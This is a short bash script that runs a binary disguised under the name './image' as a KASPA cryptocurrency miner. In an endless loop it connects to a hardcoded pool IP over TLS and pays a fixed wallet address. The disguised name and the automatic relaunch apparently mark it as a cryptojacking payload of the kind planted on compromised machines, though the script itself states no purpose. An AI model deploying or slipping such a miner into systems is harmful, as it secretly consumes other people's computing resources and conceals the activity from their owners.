#!/bin/bash
while [ 1 ]; do 
sleep 30
./image --algo KASPA --pool 47.88.32.232:443 --user kaspa:qzh5k3uwdw498pgmkn8pke3rj75f8x0w5mp8m4ue082524hw789vz7gg92kfq.$(echo A-NOCUDA-$(date +"%T")) --tls enable
sleep 3
done 
sleep 999 

